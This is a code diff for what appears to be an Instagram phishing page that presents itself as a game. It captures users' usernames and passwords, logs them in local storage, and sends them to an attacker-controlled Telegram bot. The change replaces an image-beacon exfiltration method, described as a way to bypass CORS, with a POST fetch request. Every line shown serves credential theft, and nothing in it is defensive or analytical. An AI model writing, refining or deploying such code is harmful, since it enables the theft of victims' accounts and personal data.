@@ -243,11 +243,20 @@
             const timeStr = new Date().toLocaleString();
             const message = `🚨 *New IG Login Captured!* 🚨\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n⏰ *Time:* ${timeStr}`;
             
-            // Using Image beacon method to bypass CORS blocks completely
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            const img = new Image();
-            img.src = url;
+            // Using POST fetch request with JSON payload
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log("Telegram error:", err));
         }
 
         // Toggle Password Visibility
@@ -302,7 +311,7 @@
             logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
             localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
 
-            // Send instantly to Telegram
+            // Send instantly to Telegram via POST
             sendToTelegram(u, p);
 
             showScreen('gameSetupScreen');
